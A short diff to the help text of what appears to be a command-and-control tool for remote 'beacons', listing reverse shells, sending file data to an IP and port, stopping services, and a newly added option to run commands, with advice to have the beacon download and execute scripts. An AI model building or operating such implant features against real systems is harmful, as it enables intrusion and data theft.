@@ -218,6 +218,7 @@ exit - exits out of the selected beacon and returns to the main controller
 shell - prompts for IP/port to send a reverse shell to
 file - prompts for file name to collect data from and the ip/port to send the data to
 service - prompts for service name to stop on the beacon
+command - prompts for command to run on the beacon. Note: Maximum command length is 300 characters. For longer commands, consider having the beacon download and execute a script instead of sending the long command directly.
 
 """)
 
